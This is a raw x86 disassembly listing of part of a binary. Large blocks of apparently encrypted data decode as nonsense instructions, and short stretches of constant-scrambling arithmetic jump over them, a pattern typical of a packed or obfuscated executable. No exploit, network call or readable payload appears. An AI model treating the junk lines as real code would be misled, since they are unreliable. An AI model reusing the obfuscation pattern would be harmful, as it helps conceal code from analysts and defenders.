  40cb03:	adc    al,0xd3
  40cb05:	inc    esi
  40cb06:	fisub  DWORD PTR [ecx-0x1b]
  40cb09:	push   ds
  40cb0a:	inc    esp
  40cb0b:	and    ebx,DWORD PTR [esi-0x4e1d95ba]
  40cb11:	(bad)  
  40cb12:	jae    0x40cb26
  40cb14:	(bad)
  40cb17:	jno    0x40cb21
  40cb19:	cmp    BYTE PTR [ecx+0x264704af],dl
  40cb1f:	push   edx
  40cb20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb21:	ds pop eax
  40cb23:	mov    al,ds:0xf884f3f7
  40cb28:	cs pop es
  40cb2a:	cdq    
  40cb2b:	fcom   QWORD PTR [eax+0x4]
  40cb2e:	imul   edi,DWORD PTR [eax+eax*8],0xf16170c0
  40cb35:	jl     0x40cbb2
  40cb37:	into   
  40cb38:	std    
  40cb39:	leave  
  40cb3a:	addr16 cs and al,dl
  40cb3e:	jne    0x40caf5
  40cb40:	sbb    al,0xc4
  40cb42:	jl     0x40cae5
  40cb44:	clc    
  40cb45:	cli    
  40cb46:	les    esp,FWORD PTR ds:0xa36ad587
  40cb4c:	retf   0xb149
  40cb4f:	jnp    0x40cb9b
  40cb51:	sub    bh,BYTE PTR [esi+0x69]
  40cb54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb55:	js     0x40cbad
  40cb57:	mov    esi,0x390867a4
  40cb5c:	dec    eax
  40cb5d:	dec    edx
  40cb5e:	pop    esi
  40cb5f:	sar    ah,cl
  40cb61:	xor    esi,esp
  40cb63:	rcl    BYTE PTR [edi],0x6d
  40cb66:	test   al,0x2c
  40cb68:	rcl    DWORD PTR [edi-0xb],1
  40cb6b:	sbb    dl,BYTE PTR [edx-0x3a3c54d8]
  40cb71:	call   0xd642:0x60e30e84
  40cb78:	int    0xad
  40cb7a:	fstp   QWORD PTR [eax-0x761f8cfa]
  40cb80:	dec    eax
  40cb81:	or     BYTE PTR [edx-0x5d28edbe],bh
  40cb87:	cli    
  40cb88:	call   0xba71:0x876b3a45
  40cb8f:	vdivpd ymm3,ymm7,YMMWORD PTR [ecx+esi*1-0x14]
  40cb95:	outs   dx,BYTE PTR ds:[esi]
  40cb96:	jge    0x40cbca
  40cb98:	icebp  
  40cb99:	pop    ecx
  40cb9a:	mov    ds:0xedba8f07,al
  40cb9f:	out    0x47,al
  40cba1:	stos   DWORD PTR es:[edi],eax
  40cba2:	scas   al,BYTE PTR es:[edi]
  40cba3:	shr    DWORD PTR ds:[edi+0x5d02a32d],cl
  40cbaa:	pop    ecx
  40cbab:	mov    ch,0xfd
  40cbad:	sar    ah,1
  40cbaf:	mov    ah,0x19
  40cbb1:	(bad)  
  40cbb2:	loope  0x40cba3
  40cbb4:	pop    edx
  40cbb5:	cli    
  40cbb6:	shr    BYTE PTR [ebp+0x56],0x4d
  40cbba:	jmp    0x40cbd9
  40cbbc:	icebp  
  40cbbd:	das    
  40cbbe:	aam    0xaf
  40cbc0:	stos   BYTE PTR es:[edi],al
  40cbc1:	pop    ebp
  40cbc2:	xchg   edx,eax
  40cbc3:	push   ss
  40cbc4:	mov    eax,ds:0xa9515ee6
  40cbc9:	mov    DWORD PTR [edx],ecx
  40cbcb:	or     cl,BYTE PTR [ecx]
  40cbcd:	jne    0x40cbbd
  40cbcf:	fdiv   st,st(2)
  40cbd1:	fisubr DWORD PTR [ecx+0x3480afaa]
  40cbd7:	nop
  40cbd8:	ins    BYTE PTR es:[edi],dx
  40cbd9:	mov    cl,0x99
  40cbdb:	scas   al,BYTE PTR es:[edi]
  40cbdc:	xchg   ecx,eax
  40cbdd:	cmc    
  40cbde:	jmp    0x0:0x21830f
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422640,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x55a873f4],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [eax-0x72d8e8f3],dh
  40cc7c:	addr16 inc esi
  40cc7e:	jmp    0xb3c7f018
  40cc83:	mov    ecx,0x6b419f72
  40cc88:	pop    esi
  40cc89:	sbb    eax,0xfae4c7b0
  40cc8e:	dec    ebx
  40cc8f:	psadbw mm6,mm6
  40cc92:	fisttp WORD PTR ds:0x2aa68989
  40cc98:	dec    esp
  40cc99:	jne    0x40cc4b
  40cc9b:	xchg   ebp,eax
  40cc9c:	mov    ebp,0x63eef804
  40cca1:	sbb    ebx,DWORD PTR [edx-0x6b]
  40cca4:	pop    esi
  40cca5:	adc    BYTE PTR [eax+0xb],ah
  40cca8:	loopne 0x40cc34
  40ccaa:	add    eax,0xaa0bf860
  40ccaf:	pushf  
  40ccb0:	sub    BYTE PTR [esi+0x18af8190],bh
  40ccb6:	sbb    al,0x52
  40ccb8:	lods   eax,DWORD PTR ds:[esi]
  40ccb9:	cmp    dh,0x80
  40ccbc:	iret   
  40ccbd:	scas   al,BYTE PTR es:[edi]
  40ccbe:	adc    BYTE PTR [ecx],dl
  40ccc0:	push   ss
  40ccc1:	pop    edi
  40ccc2:	retf   0x4024
  40ccc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccc6:	jle    0x40cc86
  40ccc8:	hlt    
  40ccc9:	imul   esi
  40cccb:	adc    al,0x57
  40cccd:	and    ah,BYTE PTR [edi+edx*4-0x1c]
  40ccd1:	in     eax,0xa9
  40ccd3:	out    dx,eax
  40ccd4:	out    0x19,eax
  40ccd6:	lds    ebp,FWORD PTR [edx+0x4f1f857e]
  40ccdc:	out    dx,eax
  40ccdd:	jne    0x40cc71
  40ccdf:	int3   
  40cce0:	test   al,0xd1
  40cce2:	dec    esp
  40cce3:	repz mov al,BYTE PTR [ebp-0x5]
  40cce7:	ds (bad) 
  40cce9:	scas   eax,DWORD PTR es:[edi]
  40ccea:	shl    BYTE PTR [esi],0xb9
  40cced:	(bad)  
  40ccee:	(bad)  
  40ccef:	std    
  40ccf0:	ret    
  40ccf1:	sbb    DWORD PTR [ebp+0x217fabfd],ebx
  40ccf7:	ins    DWORD PTR es:[edi],dx
  40ccf8:	cmp    esi,edx
  40ccfa:	test   ebx,esi
  40ccfc:	adc    al,0xaa
  40ccfe:	sti    
  40ccff:	jl     0x40cd80
  40cd01:	stos   BYTE PTR es:[edi],al
  40cd02:	mov    al,0x6f
  40cd04:	jg     0x40ccbc
  40cd06:	(bad)  
  40cd07:	fwait
  40cd08:	cs inc ecx
  40cd0a:	inc    edx
  40cd0b:	test   eax,0x9a00af2
  40cd10:	dec    edx
  40cd11:	jno    0x40cd48
  40cd13:	cmp    cl,BYTE PTR [edi]
  40cd15:	mov    ah,0x5f
  40cd17:	jg     0x40cce4
  40cd19:	imul   DWORD PTR [eax-0x69]
  40cd1c:	test   al,0x72
  40cd1e:	add    ecx,DWORD PTR [edx+0x3259f947]
  40cd24:	aam    0xc
  40cd26:	imul   edx,DWORD PTR [edx+ecx*1+0x28],0x31e472f
  40cd2e:	jb     0x40cd4f
  40cd30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd31:	rcl    edi,0x8d
  40cd34:	mov    ah,0xec
  40cd36:	paddusb mm3,QWORD PTR [eax]
  40cd39:	hlt    
  40cd3a:	je     0x40cd46
  40cd3c:	adc    BYTE PTR [edi],ah
  40cd3e:	mov    al,ds:0x747b03ef
  40cd43:	retf   
  40cd44:	fdivr  QWORD PTR [ebp+0x18]
  40cd47:	shr    DWORD PTR [edi-0x27],cl
  40cd4a:	sub    DWORD PTR [edi+0x24acd251],edx
  40cd50:	mov    ds:0xf2b47fa6,al
  40cd55:	add    eax,0x4a99cb56
  40cd5a:	les    ebp,FWORD PTR [edi+0x1705382a]
  40cd60:	arpl   WORD PTR [edx-0x75],sp
  40cd63:	aaa    
  40cd64:	outs   dx,DWORD PTR ds:[esi]
  40cd65:	loop   0x40cd39
  40cd67:	xchg   edi,eax
  40cd68:	cmp    ecx,DWORD PTR [edi+0x72]
  40cd6b:	fisubr DWORD PTR [esi]
  40cd6d:	and    DWORD PTR [edi+0x1102527a],ecx
  40cd73:	in     eax,0x3a
  40cd75:	imul   esi,DWORD PTR [eax+0x32],0x17
  40cd79:	xlat   BYTE PTR ds:[ebx]
  40cd7a:	mov    ah,0xd
  40cd7c:	mov    al,0xaa
  40cd7e:	push   edi
  40cd7f:	dec    edi
  40cd80:	in     eax,0xd6
  40cd82:	adc    esp,DWORD PTR [edx+0x5b124995]
  40cd88:	xchg   edi,eax
  40cd89:	pop    esp
  40cd8a:	shl    DWORD PTR [edx-0x28],1
  40cd8d:	dec    ebx
  40cd8e:	sub    DWORD PTR [ebp-0x51],ebx
  40cd91:	pusha  
  40cd92:	pop    ebp
  40cd93:	sbb    dh,dl
  40cd95:	arpl   WORD PTR [ecx],ax
  40cd97:	fs or  eax,0xdeeaddc7
  40cd9d:	xlat   BYTE PTR ds:[ebx]
  40cd9e:	rol    DWORD PTR [ebx],cl
  40cda0:	mov    bh,0x94
  40cda2:	mov    ch,0xe7
  40cda4:	mov    ebp,0x884a30dd
  40cda9:	jo     0x40cdf7
  40cdab:	addr16 push edx
  40cdad:	mov    esi,0xd88e4b6a
  40cdb2:	outs   dx,DWORD PTR ds:[esi]
  40cdb3:	sub    ebx,DWORD PTR [ebp+0x73c73be5]
  40cdb9:	repz in eax,dx
  40cdbb:	dec    edi
  40cdbc:	test   al,0xa3
  40cdbe:	xchg   ebp,eax
  40cdbf:	in     al,0x10
  40cdc1:	jb     0x40cddd
  40cdc3:	dec    esi
  40cdc4:	stos   BYTE PTR es:[edi],al
  40cdc5:	push   0x2bfe6c2b
  40cdca:	lock test eax,0x6c4e5bea
  40cdd0:	clc    
  40cdd1:	dec    esi
  40cdd2:	pushf  
  40cdd3:	xchg   esi,eax
  40cdd4:	mov    esp,0x1cdb520b
  40cdd9:	pop    edi
  40cdda:	fld    st(4)
  40cddc:	jno    0x40ce18
  40cdde:	test   al,0x46
  40cde0:	mov    DWORD PTR [ebx-0x1b],edi
  40cde3:	dec    ebx
  40cde4:	out    0xe8,al
  40cde6:	dec    eax
  40cde7:	sahf   
  40cde8:	xor    eax,0xd773b5cc
  40cded:	inc    ebx
  40cdee:	addr16 inc edx
  40cdf0:	sahf   
  40cdf1:	lock cmp al,0x43
  40cdf4:	call   0x41a806a4
  40cdf9:	scas   eax,DWORD PTR es:[edi]
  40cdfa:	(bad)  
  40cdfb:	call   0x33a8:0x69980cbf
  40ce02:	adc    eax,0xab0161d1
  40ce07:	inc    ecx
  40ce08:	or     al,0x2c
  40ce0a:	cmp    eax,0xc4e3ee2c
  40ce0f:	jp     0x40cdd6
  40ce11:	push   esi
  40ce12:	sub    dh,dl
  40ce14:	xchg   DWORD PTR gs:[ecx-0x4a8d6557],edi
  40ce1b:	add    eax,DWORD PTR [ebp-0x4a]
  40ce1e:	sub    al,0xea
  40ce20:	inc    ecx
  40ce21:	out    dx,eax
  40ce22:	sbb    ch,bh
  40ce24:	rdmsr  
  40ce26:	inc    esp
  40ce27:	pop    es
  40ce28:	aam    0x73
  40ce2a:	xchg   esp,eax
  40ce2b:	jnp    0x40ce5b
  40ce2d:	sub    BYTE PTR [ebp-0x56],dl
  40ce30:	sbb    BYTE PTR [ecx+0x79],0xd0
  40ce34:	outs   dx,BYTE PTR ds:[esi]
  40ce35:	jae    0x40ce82
  40ce37:	iret   
  40ce38:	popf   
  40ce39:	sub    al,0x43
  40ce3b:	enter  0xf858,0xfc
  40ce3f:	mov    ebx,edi
  40ce41:	sbb    esp,DWORD PTR [ebx-0x67c3e21]
  40ce47:	push   DWORD PTR [eax+0xf]
  40ce4a:	add    al,0x6a
  40ce4c:	mov    BYTE PTR [esi],al
  40ce4e:	rcl    BYTE PTR [ecx-0x50],cl
  40ce51:	nop
  40ce52:	mov    al,dh
  40ce54:	jmp    0x6ef40765
  40ce59:	pusha  
  40ce5a:	retf   0xd17f
  40ce5d:	imul   esi,DWORD PTR [ebx+ebp*4-0x4b],0xffffffc6
  40ce62:	push   ebp
  40ce63:	aad    0xf9
  40ce65:	lods   al,BYTE PTR ds:[esi]
  40ce66:	adc    BYTE PTR [ebx+0x306e17a9],cl
  40ce6c:	mov    cl,0x2c
  40ce6e:	(bad)  
  40ce6f:	fcmovnb st,st(6)
  40ce71:	cmp    DWORD PTR ds:0x799eced0,0x7642e819
  40ce7b:	dec    edi
  40ce7c:	push   eax
  40ce7d:	clc    
  40ce7e:	sbb    eax,0xf65b0b0e
  40ce83:	jmp    0x40ceff
  40ce85:	pop    edx
  40ce86:	out    dx,al
  40ce87:	inc    edx
  40ce88:	xor    al,0xe5
  40ce8a:	jecxz  0x40cee1
  40ce8c:	inc    esi
  40ce8d:	scas   eax,DWORD PTR es:[edi]
  40ce8e:	imul   eax,DWORD PTR [esi],0xffffff8d
  40ce91:	clc    
  40ce92:	repnz in eax,dx
  40ce94:	xchg   esi,eax
  40ce95:	xchg   esp,eax
  40ce96:	or     al,0x13
  40ce98:	inc    edi
  40ce99:	popf   
  40ce9a:	push   ebx
  40ce9b:	xchg   DWORD PTR [esi],ecx
  40ce9d:	jnp    0x40cef1
  40ce9f:	xchg   esi,eax
  40cea0:	pop    esi
  40cea1:	loope  0x40ceeb
  40cea3:	scas   eax,DWORD PTR es:[edi]
  40cea4:	repz daa 
  40cea6:	xor    eax,0x2be8842d
  40ceab:	not    DWORD PTR [ecx]
  40cead:	out    0x2c,eax
  40ceaf:	(bad)  
  40ceb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb1:	inc    edi
  40ceb2:	loope  0x40cf28
  40ceb4:	pushf  
  40ceb5:	int3   
  40ceb6:	mov    ah,0xb2
  40ceb8:	xchg   BYTE PTR [ecx+0x2a],ah
  40cebb:	lock inc ecx
  40cebd:	sub    al,BYTE PTR [ebp+esi*8+0x31d63ed1]
  40cec4:	int    0x3b
  40cec6:	mov    ecx,0x645f208d
  40cecb:	mov    dh,0xf
  40cecd:	and    ecx,DWORD PTR [ecx-0x46537d10]
  40ced3:	out    dx,eax
  40ced4:	pusha  
  40ced5:	popa   
  40ced6:	add    BYTE PTR [eax-0xa49fe91],dl
  40cedc:	adc    edx,DWORD PTR [edx]
  40cede:	jecxz  0x40ce99
  40cee0:	fcom   QWORD PTR [edi]
  40cee2:	lods   eax,DWORD PTR ds:[esi]
  40cee3:	lods   al,BYTE PTR ds:[esi]
  40cee4:	add    cl,cl
  40cee6:	inc    edx
  40cee7:	cmc    
  40cee8:	addr16 xchg esi,eax
  40ceea:	retf   0xe8e2
  40ceed:	ins    BYTE PTR es:[edi],dx
  40ceee:	shl    DWORD PTR [esi-0x21dd2601],cl
  40cef4:	inc    ebx
  40cef5:	retf   
  40cef6:	add    eax,edx
  40cef8:	repnz pop ss
  40cefa:	mov    edx,0x43d3441a
  40ceff:	in     eax,dx
  40cf00:	data16 js 0x40cf5e
  40cf03:	clc    
  40cf04:	mov    al,0x88
  40cf06:	pop    edi
  40cf07:	ja     0x40cf61
  40cf09:	scas   eax,DWORD PTR es:[edi]
  40cf0a:	sbb    eax,0x938bc983
  40cf0f:	push   esi
  40cf10:	mov    esi,0xd37acfa2
  40cf15:	mov    cs,WORD PTR [ecx*4+0x6a8ac8c1]
  40cf1c:	xor    ch,0x8b
  40cf1f:	inc    ebp
  40cf20:	cld    
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422538
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x699b432d],esi
  40cfad:	mov    edi,0x18e872b0
  40cfb2:	sbb    dl,dl
  40cfb4:	adc    al,0x18
  40cfb6:	sbb    BYTE PTR [eax+0x6d31b6e6],dl
  40cfbc:	ja     0x40cfba
  40cfbe:	imul   ebx,ebx,0x1cd2a46d
  40cfc4:	adc    eax,0x9d1b3982
  40cfc9:	and    BYTE PTR [eax-0x3b1310ce],dl
  40cfcf:	ror    BYTE PTR [edx-0x1b840f14],cl
  40cfd5:	shl    BYTE PTR [esi-0x3e],1
  40cfd8:	mov    ch,0x52
  40cfda:	pop    ecx
  40cfdb:	cdq    
  40cfdc:	ja     0x40cfa3
  40cfde:	and    eax,0xdaf7648
  40cfe3:	pop    ss
  40cfe4:	jbe    0x40d03a
  40cfe6:	pop    esi
  40cfe7:	call   FWORD PTR [ebp-0x2b]
  40cfea:	iret   
  40cfeb:	(bad)  
  40cfec:	ja     0x40d034
  40cfee:	inc    ebp
  40cfef:	sbb    ecx,DWORD PTR [ecx-0x48940a49]
  40cff5:	jmp    0xcaeecce9
  40cffa:	fmul   DWORD PTR [ebx-0x26]
  40cffd:	add    ch,BYTE PTR [edx-0x286ef8ec]
  40d003:	and    esi,esi
  40d005:	cmp    DWORD PTR [ecx+0x4871d44d],0x75f773e8
  40d00f:	pop    edi
  40d010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d011:	mov    eax,0x4bfbe462
  40d016:	sub    BYTE PTR [ecx+eiz*1-0x2d],0x54
  40d01b:	in     eax,dx
  40d01c:	stos   BYTE PTR es:[edi],al
  40d01d:	adc    dh,BYTE PTR [edi-0x6e]
  40d020:	ret    
  40d021:	jmp    0x40d08d
  40d023:	xor    BYTE PTR [edx],0x9b
  40d026:	sbb    al,0xa7
  40d028:	pop    es
  40d029:	leave  
  40d02a:	outs   dx,DWORD PTR fs:[esi]
  40d02c:	(bad)  
  40d02d:	xor    DWORD PTR [edx],ebp
  40d02f:	daa    
  40d030:	inc    esi
  40d031:	inc    esp
  40d032:	push   0x20
  40d034:	addr16 adc eax,0x80e444ae
  40d03a:	in     al,dx
  40d03b:	xor    dh,BYTE PTR [edx-0x53589878]
  40d041:	xchg   esp,eax
  40d042:	sub    BYTE PTR [edi],dl
  40d044:	call   0x4389:0xa45a8b78
  40d04b:	call   0xcef04514
  40d050:	fcmovnb st,st(3)
  40d052:	psllq  mm6,QWORD PTR [esi+eax*4-0x1b5ab328]
  40d05a:	sub    esp,ebx
  40d05c:	enter  0x8ef9,0x8e
  40d060:	imul   ecx,DWORD PTR [ebx+0x181886c0],0x6cf7706a
  40d06a:	mov    esi,0xbc9df27d
  40d06f:	repz mov al,0x10
  40d072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d073:	push   ebp
  40d074:	stc    
  40d075:	or     eax,0xd2bca6c8
  40d07a:	dec    ebp
  40d07b:	mov    ecx,0x64903d7c
  40d080:	enter  0xbbc3,0x27
  40d084:	jnp    0x40d01f
  40d086:	xchg   edx,ecx
  40d088:	sbb    ecx,DWORD PTR [eax-0x43]
  40d08b:	in     al,0x76
  40d08d:	rcr    BYTE PTR [esi-0x5bd997a8],cl
  40d093:	and    eax,ebp
  40d095:	dec    ecx
  40d096:	fs mov al,0xf3
  40d099:	imul   esp,DWORD PTR [ebp-0x2cc1fc2e],0x5989d432
  40d0a3:	cmc    
  40d0a4:	mov    dl,0x51
  40d0a6:	sbb    ecx,ebx
  40d0a8:	fsub   st(4),st
  40d0aa:	adc    ebp,DWORD PTR [esp+edi*2]
  40d0ad:	sub    al,BYTE PTR [eax]
  40d0af:	mov    dl,0xee
  40d0b1:	repz shl BYTE PTR [esi+ebx*4+0x741b69f7],1
  40d0b9:	xor    ah,BYTE PTR [eiz*8+0x27e493f8]
  40d0c0:	push   esi
  40d0c1:	jne    0x40d10d
  40d0c3:	call   0x4bad6da1
  40d0c8:	jb     0x40d116
  40d0ca:	cmc    
  40d0cb:	test   eax,ebp
  40d0cd:	fbstp  TBYTE PTR [edx+eax*2-0x26]
  40d0d1:	in     eax,dx
  40d0d2:	(bad)  
  40d0d3:	or     ch,BYTE PTR ds:0xfbbdad60
  40d0d9:	leave  
  40d0da:	pusha  
  40d0db:	outs   dx,DWORD PTR ds:[esi]
  40d0dc:	sub    ecx,DWORD PTR ds:[eax-0x4cfcc7ff]
  40d0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0e4:	(bad)  
  40d0e5:	gs jae 0x40d144
  40d0e8:	mov    esi,0xdd112e37
  40d0ed:	adc    DWORD PTR [edx-0x528033ff],edi
  40d0f3:	sbb    dl,BYTE PTR [ebp+ebp*2+0x6534b198]
  40d0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fb:	push   esp
  40d0fc:	jg     0x40d0c1
  40d0fe:	neg    BYTE PTR [edi]
  40d100:	enter  0x96e3,0xf8
  40d104:	mov    al,ds:0x4e3c6eb6
  40d109:	or     esi,edx
  40d10b:	pusha  
  40d10c:	adc    al,0x3d
  40d10e:	or     eax,0x10140bb2
  40d113:	(bad)  
  40d114:	sahf   
  40d115:	pop    es
  40d116:	and    cl,al
  40d118:	mov    eax,ds:0x89efd480
  40d11d:	or     al,0x50
  40d11f:	aas    
  40d120:	inc    esp
  40d121:	pop    edx
  40d122:	imul   edx,DWORD PTR [ebx],0x85b696f
  40d128:	retf   0x76d5
  40d12b:	iret   
  40d12c:	cwde   
  40d12d:	cmp    ch,BYTE PTR [edx+0x7f]
  40d130:	popf   
  40d131:	pop    ds
  40d132:	jecxz  0x40d156
  40d134:	inc    edx
  40d135:	mov    bl,0xdd
  40d137:	mov    cl,0x6a
  40d139:	mov    edx,0xbc3af578
  40d13e:	dec    ebx
  40d13f:	add    al,al
  40d141:	in     al,0x39
  40d143:	test   al,0x33
  40d145:	clc    
  40d146:	sbb    dh,BYTE PTR [ecx+0x7f]
  40d149:	mov    eax,0x57a3d076
  40d14e:	push   0x6eab151b
  40d153:	xor    esp,DWORD PTR [ebx+eax*2+0x6e]
  40d157:	xchg   ebp,eax
  40d158:	adc    ch,BYTE PTR [ecx]
  40d15a:	std    
  40d15b:	test   al,0xbd
  40d15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d15e:	sar    DWORD PTR [ebx+0x2],0xff
  40d162:	retf   0x164e
  40d165:	sbb    eax,0xb20ab6ea
  40d16a:	fbld   TBYTE PTR [edi+0x4914e92d]
  40d170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d171:	sub    DWORD PTR [edi],ecx
  40d173:	pop    esp
  40d174:	xor    ebp,DWORD PTR [edx+ecx*8+0x3]
  40d178:	pop    edi
  40d179:	cld    
  40d17a:	and    bh,bh
  40d17c:	ds jge 0x40d142
  40d17f:	aad    0xfe
  40d181:	hlt    
  40d182:	xlat   BYTE PTR ds:[ebx]
  40d183:	sub    al,0xc
  40d185:	mov    dl,0x4f
  40d187:	loop   0x40d202
  40d189:	sbb    al,0x1a
  40d18b:	retf   
  40d18c:	adc    ebp,DWORD PTR [eax+0x31]
  40d18f:	xchg   dx,ax
  40d191:	popa   
  40d192:	ret    0xcaf7
  40d195:	push   esp
  40d196:	pop    ss
  40d197:	retf   
  40d198:	jge    0x40d1f7
  40d19a:	ja     0x40d210
  40d19c:	lds    ebx,FWORD PTR es:[ebx+ecx*1-0xe3a4c6e]
  40d1a4:	push   cs
  40d1a5:	ret    0x80e4
  40d1a8:	rol    BYTE PTR [edx+0x5afddfd3],cl
  40d1ae:	lods   eax,DWORD PTR ds:[esi]
  40d1af:	and    DWORD PTR [ecx+0x1e6b313f],0x7704c858
  40d1b9:	pop    edi
  40d1ba:	xchg   ebx,eax
  40d1bb:	fstp   QWORD PTR [ebx+0xb]
  40d1be:	xchg   edi,eax
  40d1bf:	push   ebp
  40d1c0:	jmp    0x40d216
  40d1c2:	or     BYTE PTR [ecx],0xbe
  40d1c5:	es xchg edx,eax
  40d1c7:	xchg   ecx,eax
  40d1c8:	dec    ebp
  40d1c9:	adc    eax,0xeb6c3452
  40d1ce:	jmp    0xfca376d7
  40d1d3:	push   ss
  40d1d4:	rcr    BYTE PTR [eax-0x1d],cl
  40d1d7:	rol    DWORD PTR [ebx-0x4d],0x2c
  40d1db:	fld    DWORD PTR [edi]
  40d1dd:	sub    ebp,DWORD PTR [eax+0x8]
  40d1e0:	test   eax,0x48a14923
  40d1e5:	(bad)  
  40d1e6:	in     al,dx
  40d1e7:	pop    es
  40d1e8:	fcom   DWORD PTR [eax*8-0x4898a0c4]
  40d1ef:	lock cmp DWORD PTR [edi-0x42],esi
  40d1f3:	sbb    al,0x3d
  40d1f5:	or     eax,0x93fe78d2
  40d1fa:	push   esi
  40d1fb:	loopne 0x40d208
  40d1fd:	inc    esp
  40d1fe:	mov    bp,0x1ea4
  40d202:	inc    esp
  40d203:	ins    DWORD PTR es:[edi],dx
  40d204:	push   ecx
  40d205:	pop    ecx
  40d206:	pop    esi
  40d207:	sbb    ah,BYTE PTR [edx-0x78006892]
  40d20d:	arpl   WORD PTR [edi*1-0x70473118],dx
  40d214:	pop    edx
  40d215:	scas   al,BYTE PTR es:[edi]
  40d216:	sahf   
  40d217:	and    eax,0xc3b0bc5
  40d21c:	outs   dx,BYTE PTR ds:[esi]
  40d21d:	push   eax
  40d21e:	outs   dx,DWORD PTR ds:[esi]
  40d21f:	dec    edi
  40d220:	sub    DWORD PTR [eax],ebx
  40d222:	pop    eax
  40d223:	mov    al,0x25
  40d225:	fwait
  40d226:	sti    
  40d227:	push   ds
  40d228:	xchg   esi,eax
  40d229:	sub    DWORD PTR [edi],0xffffffc9
  40d22c:	mov    dl,0x23
  40d22e:	ret    0xeb66
  40d231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d232:	cmp    ch,ah
  40d234:	pop    ebx
  40d235:	inc    esi
  40d236:	jle    0x40d208
  40d238:	pop    edx
  40d239:	bound  eax,QWORD PTR [eax+esi*4]
  40d23c:	adc    DWORD PTR [edx-0x8],ebp
  40d23f:	lea    esp,[ecx-0x48]
  40d242:	adc    BYTE PTR [ebx+ecx*4],0x61
  40d246:	cmp    ebp,DWORD PTR [edi+0x53]
  40d249:	inc    ecx
  40d24a:	mov    esp,DWORD PTR ds:0xc7e97f35
  40d250:	inc    eax
  40d251:	rcr    BYTE PTR [ebx],0x51
  40d254:	dec    ebx
  40d255:	jle    0x40d1df
  40d257:	add    esi,ecx
  40d259:	rol    BYTE PTR [edi-0x77c8bd6f],0x4
  40d260:	push   cs
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
